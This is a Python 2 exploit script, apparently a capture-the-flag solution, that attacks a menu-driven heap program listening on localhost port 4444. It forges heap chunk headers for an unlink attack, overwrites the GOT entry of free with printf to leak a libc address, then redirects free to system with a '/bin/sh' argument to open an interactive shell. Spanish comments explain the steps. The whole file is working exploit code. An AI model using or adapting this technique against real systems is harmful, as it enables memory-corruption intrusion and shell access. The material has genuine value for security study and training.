from amnesia import *
from struct import pack, unpack

p64 = lambda x: pack("<Q", x)
u64 = lambda x: unpack("<Q", x)[0]

s = amnesiaSocket("localhost", 4444)
s.writeLine("1")
s.writeLine("256")
s.writeLine("1")
s.writeLine("256")
s.writeLine("2")
s.writeLine("1")
s.writeLine("272")
# 0x602130 = ptr1 - 3
# 0x602138 = ptr1 - 2
s.writeLine(p64(0x0) + p64(0x101) + p64(0x602130) + p64(0x602138) + "A"*224 + p64(0x100) + p64(0x110))
	    #prev_size #size        #fd             #bk                       #prev_size   #size
s.writeLine("3")
s.writeLine("2")
s.writeLine("2")
s.writeLine("1")
s.writeLine("48")
# 0x602018 = ptr1 = free@got.plt
# 0x602040 = ptr2 = printf@got.plt
# 0x602150 = ptr3
s.writeLine(p64(0x0) + p64(0x0) + p64(0x0) + p64(0x602018) + p64(0x602040) + p64(0x602150))
	    #ptr1-3    #ptr1-2    #ptr1-1    #ptr1           #ptr2           #ptr3
s.writeLine("2")
s.writeLine("1")
s.writeLine("8")
# 0x4007a0 = printf@plt
# en este punto se hace una llamada a free que en
# la got de free está el ret2plt = 0x4007a0 a
# printf con argumento ptr2 = 0x602040
s.writeLine(p64(0x4007a0))
s.writeLine("3")
s.writeLine("2")
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
s.readLine()
leak = u64(s.read(6).ljust(8, '\0'))
print "base libc: %s" % hex(leak + 0x1B1E90)
s.writeLine("2")
s.writeLine("3")
s.writeLine("8")
s.writeLine(p64(leak + 0x1169FA)) # /bin/sh
s.writeLine("2")
s.writeLine("1")
s.writeLine("8")
s.writeLine(p64(leak - 0xf900))	  # system
s.writeLine("3")
s.writeLine("2")
s.interact_shell()
